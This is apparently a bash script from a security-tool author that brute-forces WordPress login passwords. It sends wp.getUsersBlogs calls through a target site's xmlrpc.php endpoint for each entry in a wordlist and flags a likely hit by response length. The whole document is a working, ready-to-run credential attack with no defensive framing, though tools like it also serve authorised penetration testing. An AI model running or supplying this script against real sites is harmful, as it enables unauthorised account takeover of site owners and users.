#!/bin/bash

#colores
R="\e[38;2;255;29;33m"
W="\e[0m"

if [[ ! $1 ]] || [[ ! $2 ]] || [[ ! $3 ]] && [[ ! -f $3 ]];then
	echo -e "\n[!] $0 <url> <user> <wordlist>\n"
	exit
fi

clear
echo -e """$R
	____  ___  _____  .____   _____________________________   ___.                 __          
	\   \/  / /     \ |    |  \______   \______   \_   ___ \  \_ |_________ __ ___/  |_  ____  
	 \     / /  \ /  \|    |   |       _/|     ___/    \  \/   | __ \_  __ \  |  \   __\/ __ \ 
	 /     \/    Y    \    |___|    |   \|    |   \     \____  | \_\ \  | \/  |  /|  | \  ___/ 
	/___/\  \____|__  /_______ \____|_  /|____|    \______  /  |___  /__|  |____/ |__|  \___  >
	      \_/       \/        \/      \/                  \/       \/                       \/ 
	                   [ Json Security ] [ https://github.com/JsonSecurity ] $W"""

echo -e "\n[+] URL: $1\n[+] USER: $2\n[+] WORDLIST: $3\n"

len_response=0
count=0
while read line;do
	payload="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$2</value></param><param><value>$line</value></param></params></methodCall>"
	#echo $payload
	response=$(curl -sN -X POST -d $payload "$1/xmlrpc.php")
	
	if [[ $(echo $response | wc -c) -gt $len_response ]] && [[ $count -gt 0 ]];then
		len_response=$(echo $response | wc -c)
		echo -e "[$count] CHAR: $len_response \t\tPASSWORD: $line"
		echo -e "\n$response\n" | batcat -l xml -pp
		sleep 1
	else
		len_response=$(echo $response | wc -c)
		echo -e "[$count] CHAR: $len_response \t\tPASSWORD: $line"
	fi
	let count+=1
	sleep .1
done < <(cat $3)

